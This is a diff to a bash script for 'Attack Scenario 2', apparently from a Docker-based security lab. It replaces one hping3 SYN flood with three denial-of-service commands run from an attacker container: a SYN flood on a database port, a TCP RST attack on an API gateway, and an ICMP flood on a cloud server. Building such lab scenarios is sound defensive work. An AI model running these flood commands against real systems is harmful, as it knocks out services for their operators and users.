@@ -1,9 +1,17 @@
 #!/bin/bash
 
-echo "Starting Attack Scenario 2: Database Service Disruption (DDoS)"
+echo "Starting Attack Scenario 2: Service Disruption and DoS"
 
-# Simulate a DDoS attack against the database
-docker exec attacker bash -c "echo 'Launching DDoS attack against database...' && \
-  hping3 -S --flood -p 3306 172.18.0.30 -c 1000"
+# Multiple attack vectors using hping3
+docker exec attacker bash -c "
+    echo 'Launching SYN Flood attack on database server...' &&
+    hping3 -S --flood -V -p 3306 172.18.0.30 &&
+    
+    echo 'TCP RST attack on API gateway...' &&
+    hping3 --tcp-rst -V -p 80 172.18.0.40 &&
+    
+    echo 'ICMP flood to cloud server...' &&
+    hping3 -1 --flood -V 172.18.0.20
+"
 
-echo "Attack Scenario 2 Complete"
+echo "Attack Scenario 2: Service Disruption Complete"
